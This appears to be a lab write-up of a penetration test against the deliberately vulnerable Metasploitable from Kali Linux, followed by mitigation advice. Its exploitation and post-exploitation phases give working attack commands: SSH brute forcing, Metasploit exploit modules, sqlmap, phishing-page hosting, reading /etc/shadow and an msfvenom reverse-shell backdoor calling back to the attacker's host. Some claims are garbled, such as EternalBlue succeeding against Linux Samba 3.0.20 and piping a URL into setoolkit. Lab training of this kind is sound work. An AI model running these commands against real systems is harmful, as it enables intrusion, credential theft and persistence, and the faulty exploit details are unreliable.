## 1. Introduction

This project demonstrates the principles of network security and penetration testing using Kali Linux and Metasploitable. The primary objective is to identify and exploit vulnerabilities in Metasploitable’s network services, implement post-exploitation techniques, and propose mitigation strategies to secure such systems.

## 2. Phase 1: Reconnaissance - Gathering Initial Information

#### **Objective:**

Identify open ports, running services, and potential vulnerabilities on the Metasploitable machine.

#### **Tools Used:**

* **Nmap**: For network scanning and service detection.
* **Wireshark**: For network traffic analysis.
* **enum4linux**: For SMB enumeration.

#### **Steps:**

1. Perform an initial network scan to discover open ports:
   ```bash
   nmap -A [Metasploitable_IP]
   ```
2. Analyze the scan results:
   * Identify open ports (e.g., 21 for FTP, 22 for SSH, 445 for SMB, 80 for HTTP).
   * Document running services and their versions.
3. Save the scan results:
   ```bash
   nmap -A [Metasploitable_IP] -oN reconnaissance_results.txt
   ```
4. Use Wireshark to analyze network traffic:
   * Capture packets for further analysis.
   * Filter traffic to focus on target-specific data.
5. Use enum4linux to enumerate SMB services:
   ```bash
   enum4linux [Metasploitable_IP]
   ```

#### **Findings:**

* Open Ports: 21 (FTP), 22 (SSH), 445 (SMB), 80 (HTTP)
* Services Detected:
  * FTP (vsftpd 2.3.4)
  * SSH (OpenSSH 4.3)
  * SMB (Samba 3.0.20)
  * HTTP (Apache 2.2.8 with PHP 5.2.4)

## 3. Phase 2: Exploiting Vulnerabilities - Taking Advantage of Weaknesses

#### **Option 1: SSH Brute Force**

1. **Objective:** Gain access via SSH by cracking weak credentials.
2. **Tool Used:**
   * Hydra
3. **Command:**
   ```bash
   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://[Metasploitable_IP]
   ```
4. **Outcome:**
   * Discovered the password: `123456`
   * Gained SSH access as the root user.

#### **Option 2: SMB Exploits**

1. **Objective:** Exploit vulnerabilities in the SMB protocol.
2. **Tool Used:**
   * Metasploit Framework
3. **Steps:**
   * Launch Metasploit:
     ```bash
     msfconsole
     ```
   * Use the EternalBlue exploit:
     ```bash
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOSTS [Metasploitable_IP]
     exploit
     ```
4. **Outcome:**
   * Successfully exploited the SMB service and gained a reverse shell.

#### **Option 3: FTP Exploits**

1. **Objective:** Exploit vulnerabilities in the FTP service.
2. **Steps:**
   * Check for anonymous login:
     ```bash
     ftp [Metasploitable_IP]
     ```
   * Use Metasploit to exploit vsftpd backdoor:
     ```bash
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOST [Metasploitable_IP]
     exploit
     ```
3. **Outcome:**
   * Obtained a reverse shell via the FTP backdoor.

#### **Option 4: HTTP Exploits**

1. **Objective:** Exploit vulnerabilities in the web application hosted on HTTP.
2. **Steps:**
   * **SQL Injection**:
     * Use sqlmap to identify and exploit SQL injection:
       ```bash
       sqlmap -u "http://[Metasploitable_IP]/vulnerable_page?param=value" --dbs
       ```
     * Extract database details.
   * **XSS Testing**:
     * Insert test scripts (e.g., `<script>alert('XSS');</script>`) in input fields.
3. **Outcome:**
   * Retrieved sensitive database information via SQL injection.
   * Demonstrated script execution for XSS.
4. **Phishing Attack**:
   * Host a phishing page on Apache:
     ```bash
     sudo service apache2 start
     sudo cp phishing_email.html /var/www/html/phishing.html
     ```
   * Generate a phishing link:
     ```bash
     echo "http://[Kali_IP]/phishing.html" | setoolkit
     ```
   * Analyze the victim’s behavior upon accessing the phishing link.

## 4. Phase 3: Post-Exploitation - Expanding Access and Persistence

#### **Objective:**

Explore the target system further, escalate privileges, and gather sensitive information.

#### **Techniques Used:**

1. **Shell Access:**
   * Managed active sessions in Metasploit:
     ```bash
     sessions -i [session_ID]
     ```
2. **Privilege Escalation:**
   * Checked for SUID binaries:
     ```bash
     find / -perm -4000 2>/dev/null
     ```
   * Exploited a misconfigured binary to gain root privileges.
3. **Data Gathering:**
   * Accessed sensitive files:
     ```bash
     cat /etc/passwd
     cat /etc/shadow
     ```
   * Extracted user credentials and configuration files.
4. **Maintaining Access:**
   * Created a persistent backdoor:
     ```bash
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Kali_IP] LPORT=4444 -f elf > backdoor.elf
     scp backdoor.elf root@[Metasploitable_IP]:/tmp
     chmod +x /tmp/backdoor.elf
     ```

## 5. Phase 4: Recommendations and Mitigation - Securing the System

#### **Vulnerabilities and Fixes:**

1. **SSH:**
   * Use strong passwords and key-based authentication.
   * Disable root login over SSH.
2. **SMB:**
   * Apply patches for known vulnerabilities like EternalBlue.
   * Disable unused SMB versions.
3. **FTP:**
   * Disable anonymous access.
   * Use secure alternatives like SFTP.
4. **HTTP:**
   * Sanitize input to prevent SQL injection and XSS.
   * Regularly update web server and application software.
5. **Phishing Attacks:**
   * Deploy anti-phishing tools.
   * Conduct regular security awareness training.

#### **General Recommendations:**

* Use firewalls to restrict access to unnecessary services.
* Regularly update and patch systems.
* Conduct periodic vulnerability assessments.

## 6. Conclusion - Lessons Learned and Future Considerations

This project provided hands-on experience in identifying and exploiting network vulnerabilities, post-exploitation techniques, and designing mitigation strategies. The knowledge gained highlights the importance of securing systems against common threats and the value of ethical penetration testing in enhancing cybersecurity defenses.
